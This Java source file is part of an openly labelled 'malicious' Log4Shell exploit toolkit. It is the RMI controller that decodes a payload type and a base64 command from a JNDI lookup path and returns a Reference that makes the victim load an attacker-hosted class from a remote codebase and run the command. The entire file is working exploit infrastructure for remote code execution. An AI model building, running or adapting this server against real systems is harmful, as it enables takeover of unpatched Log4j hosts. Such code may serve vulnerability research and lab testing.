package es.malvarez.log4shell.malicious.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import es.malvarez.log4shell.malicious.MaliciousProperties;
import es.malvarez.log4shell.malicious.payload.Payload;
import es.malvarez.log4shell.malicious.payload.PayloadGenerator;
import es.malvarez.log4shell.malicious.payload.PayloadType;
import es.malvarez.log4shell.malicious.util.Base64Utils;
import lombok.RequiredArgsConstructor;
import lombok.extern.log4j.Log4j2;
import sun.rmi.server.UnicastServerRef;

import javax.naming.Reference;
import java.lang.reflect.Field;
import java.net.URL;
import java.rmi.server.RemoteObject;

@Log4j2
@RequiredArgsConstructor
@RmiRoute(route = "command")
public class RmiCommandController implements RmiController {

    private final MaliciousProperties properties;

    private final PayloadGenerator payloadGenerator;

    @Override
    public ReferenceWrapper buildReference(final String object) throws Exception {
        PayloadType type = getPayloadFromBase(object);
        String command = getCmdFromBase(object);
        Payload payload = payloadGenerator.getPayload(type, command);
        log.info("Rmi result for {} redirect to {}",
                object,
                properties.getCodeBase() + payload.getClassName() + ".class");

        URL codebase = this.properties.getCodeBase();
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(
                new Reference(type.name(), payload.getClassName(), codebase.toString()));
        Field refField = RemoteObject.class.getDeclaredField("ref");
        refField.setAccessible(true);
        refField.set(referenceWrapper, new UnicastServerRef(12345));
        return referenceWrapper;
    }

    public static PayloadType getPayloadFromBase(final String base) {
        int firstIndex = base.indexOf("/");
        int lastIndex = base.lastIndexOf("/");
        String payload = base.substring(firstIndex + 1, lastIndex);
        return PayloadType.fromName(payload);
    }

    public static String getCmdFromBase(final String base) {
        int firstIndex = base.lastIndexOf("/");
        String cmd = base.substring(firstIndex + 1);
        return Base64Utils.fromBase64(cmd);
    }
}
